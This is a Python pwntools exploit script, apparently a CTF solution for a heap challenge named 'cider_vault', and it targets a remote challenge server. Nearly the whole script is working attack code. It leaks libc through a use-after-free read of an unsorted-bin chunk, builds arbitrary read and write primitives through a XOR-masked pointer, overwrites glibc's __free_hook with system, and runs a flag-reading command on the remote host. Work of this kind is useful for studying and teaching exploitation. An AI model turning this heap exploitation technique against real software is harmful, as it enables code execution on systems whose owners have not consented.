from pwn import *

# Cấu hình
exe = ELF("./cider_vault")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
# context.log_level = "debug"

XOR_KEY = 0x51f0d1ce6e5b7a91

def start():
    # Local: chạy đúng ld/libc của challenge (glibc 2.31)
    # Nếu bạn chạy remote thì tự chuyển sang remote(...)
    # return process([ld.path, "--library-path", ".", exe.path])
    return remote("chals.bitskrieg.in", 37878)

p = start()

def open_page(idx, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"page id:\n", str(idx).encode())
    p.sendlineafter(b"page size:\n", str(size).encode())

def paint_page(idx, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"page id:\n", str(idx).encode())
    p.sendlineafter(b"ink bytes:\n", str(len(data)).encode())
    p.sendafter(b"ink:\n", data)

def peek_page(idx, n):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"page id:\n", str(idx).encode())
    p.sendlineafter(b"peek bytes:\n", str(n).encode())
    data = p.recvn(n)   # đọc đúng n bytes từ write()
    # sau đó program sẽ puts("") => thêm '\n', cứ để sendlineafter ăn phần menu sau
    return data

def tear_page(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"page id:\n", str(idx).encode())

def whisper_path(idx, token):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"page id:\n", str(idx).encode())
    p.sendlineafter(b"star token:\n", str(token).encode())

def arb_read(using_idx, addr, n):
    whisper_path(using_idx, addr ^ XOR_KEY)
    return peek_page(using_idx, n)

def arb_write(using_idx, addr, data):
    whisper_path(using_idx, addr ^ XOR_KEY)
    paint_page(using_idx, data)

# ---------------- exploit ----------------

# (Bỏ heap leak vì free 1 chunk => tcache fd = NULL => leak 0)
log.info("Step 1: libc leak (unsorted bin with guard chunk)")

# victim (sẽ free để vào unsorted), guard (để chặn merge vào top)
open_page(1, 0x520)
open_page(2, 0x520)

tear_page(1)
leak = peek_page(1, 0x10)
unsorted_fd = u64(leak[:8])
unsorted_bk = u64(leak[8:16])

log.info(f"unsorted_fd={unsorted_fd:#x} unsorted_bk={unsorted_bk:#x}")
assert unsorted_fd != 0, "Unsorted leak is 0: victim likely consolidated; try allocating an extra small chunk before these."

# unsorted fd == main_arena+0x60
if "main_arena" in libc.symbols:
    arena_plus_0x60 = libc.symbols["main_arena"] + 0x60
else:
    # glibc 2.31: __malloc_hook is typically right before main_arena
    # main_arena+0x60 == __malloc_hook + 0x70 (Ubuntu 20.04 glibc 2.31 layout)
    arena_plus_0x60 = libc.symbols["__malloc_hook"] + 0x70

libc.address = unsorted_fd - arena_plus_0x60
log.success(f"libc_base = {libc.address:#x}")

log.info("Step 2: overwrite __free_hook -> system")
free_hook = libc.symbols["__free_hook"]
system = libc.symbols["system"]
arb_write(1, free_hook, p64(system))
log.success(f"__free_hook @ {free_hook:#x} = system @ {system:#x}")

log.info("Step 3: trigger system(command) via free()")
open_page(3, 0x100)
cmd = b"cat flag* 2>/dev/null; cat ./flag 2>/dev/null; echo DONE\x00"
paint_page(3, cmd)
tear_page(3)

# In flag ra stdout (không cần interactive shell)
out = p.recvrepeat(1.0)
print(out.decode(errors="ignore"))